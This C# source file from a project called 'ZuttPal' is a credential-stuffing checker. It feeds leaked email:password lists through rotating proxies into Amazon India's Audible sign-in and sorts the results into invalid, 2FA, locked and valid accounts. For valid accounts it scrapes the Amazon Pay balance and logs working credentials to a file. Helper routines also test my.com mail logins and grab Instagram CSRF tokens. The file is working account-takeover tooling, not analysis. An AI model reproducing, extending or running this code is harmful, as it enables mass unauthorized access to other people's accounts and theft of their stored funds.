using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check22
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking26.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Checking26.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking26.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = true;
								httpRequest.AddHeader("Host", "www.amazon.in");
                                httpRequest.AddHeader("Connection", "keep - alive");
								httpRequest.AddHeader("Cache - Control", "max - age = 0");
								httpRequest.AddHeader("rtt", "0");
								httpRequest.AddHeader("downlink", "10");
								httpRequest.AddHeader("ect", "4g");
								httpRequest.AddHeader("Upgrade - Insecure - Requests", "1");
								httpRequest.AddHeader("Sec-Fetch-Site", "cross-site");
								httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
								httpRequest.AddHeader("Sec-Fetch-User", "?1");
								httpRequest.AddHeader("Sec-Fetch-Dest", "document");
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
								httpRequest.AddHeader("Referer", "https://www.audible.in/?ipRedirectOverride=true");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
								Leaf.xNet.HttpResponse GetRequest = httpRequest.Get("https://www.amazon.in/ap/signin?clientContext=261-8829343-8863919&openid.return_to=https%3A%2F%2Fwww.audible.in%2F&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=amzn_audible_in&openid.mode=checkid_setup&marketPlaceId=AJO3FBRUE6J4S&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=amzn_audible_in&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.pape.max_auth_age=900&siteState=audibleid.userType%3Damzn%2Caudibleid.mode%3Did_res%2CclientContext%3D258-6725016-0755418%2CsourceUrl%3Dhttps%253A%252F%252Fwww.audible.in%252F%253F%2Csignature%3DYnx8STN8N3bvFg6oOHvFNsRSSToj3D&pf_rd_p=9616da42-656a-420f-8931-171b98767a24&pf_rd_r=42Q5G3CD5TCT1N8QZFT3");
								string capturestart = GetRequest.ToString();
								string appActionToken = yey(capturestart, "name=\"appActionToken\" value=\"", "\"");
								string openid = yey(capturestart, "name=\"openid.return_to\" value=\"", "\"");
								string prevRID = yey(capturestart, "name=\"prevRID\" value=\"", "\"");
								string workflowState = yey(capturestart, "name=\"workflowState\" value=\"", "\"");
								string content = $"appActionToken={appActionToken}&appAction=SIGNIN&openid.return_to={openid}&prevRID={prevRID}&workflowState={workflowState}&email={email}&create=0&password={password}&metadata1=true";
								string login = httpRequest.Post("https://www.amazon.in/ap/signin", content, "application/x-www-form-urlencoded").ToString();
								if (login.Contains("Your password is incorrect") || login.Contains("To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.") || login.Contains("Important Message!"))
								{
									Interlocked.Increment(ref Checking26.CheckedLines);
									Interlocked.Increment(ref Checking26.currentCpm);
									Interlocked.Increment(ref Checking26.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
								else if (login.Contains("Two-Step Verification"))
								{
									Interlocked.Increment(ref Checking26.CheckedLines);
									Interlocked.Increment(ref Checking26.currentCpm);
									Interlocked.Increment(ref Checking26.twofa);
									if (Program.config.print2fa == "True")
									{
										Console.WriteLine("[»] 2FA - " + account, Color.Yellow);
									}
									break;
								}
								else if (login.Contains("Password Reset"))
								{
									Interlocked.Increment(ref Checking26.CheckedLines);
									Interlocked.Increment(ref Checking26.currentCpm);
									Interlocked.Increment(ref Checking26.custom);
									if (Program.config.printlocked == "True")
									{
										Console.WriteLine("[»] Locked - " + account, Color.Purple);
									}
									break;
								}
								if (login.Contains("Hi") || login.Contains("Credits") || login.Contains("hi") && !login.Contains("Your password is incorrect") && !login.Contains("To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.") && !login.Contains("Important Message!"))
								{
									Interlocked.Increment(ref Checking26.CheckedLines);
									Interlocked.Increment(ref Checking26.currentCpm);
									Interlocked.Increment(ref Checking26.Hits);
									try
                                    {
										Int32 unixTimestamp = (Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;
										Leaf.xNet.HttpResponse GetRequest1 = httpRequest.Get("https://www.amazon.in/amazonpay/home/load-onep-widget?clientSessionId=<session-id>&loadTime=1197&isRequestRetried=false&isResponseCached=false&loadTimeFromRequestStart=1103&_=<tt>");
										string capturestart1 = GetRequest1.ToString();
										if (capturestart1.Contains("&#8377"))
										{
											string balancea = yey(capturestart1, "&#8377;", "<");
											string balance1 = balancea.Replace("\n        ", "");
											string balance = balance1.Replace(balance1, $"[{balance1}]");
											string capture = $"{account} - Balance: {balance} - Proxy: {httpRequest.Proxy}";
											if (Program.config.printgood == "True")
											{

												Console.WriteLine("[»] Valid - " + capture, Color.Green);
											}
											Save(Path + "\\Valid.txt", capture);
											break;
										}
										else
										{
											Interlocked.Increment(ref Checking26.CheckedLines);
											Interlocked.Increment(ref Checking26.currentCpm);
											Interlocked.Increment(ref Checking26.Bad);
											if (Program.config.printbad == "True")
											{
												Console.WriteLine("[»] Invalid - " + account, Color.Red);
											}
											break;
										}
									}
									catch
                                    {
										if (Program.config.printgood == "True")
										{

											Console.WriteLine("[»] Valid - " + account, Color.Green);
										}
										Save(Path + "\\Valid.txt", account);
										break;
									}
								}
							}
							catch (Exception )
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking26.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking26.retry);
							}
						}
					}
				}
			}
		}
		static Random random = new Random();
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}

		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						httpRequest.Proxy = Checking26.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					Checking26.Combo.Enqueue(acc1);
					Interlocked.Increment(ref Checking26.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						httpRequest.Proxy = Checking26.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref Checking26.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
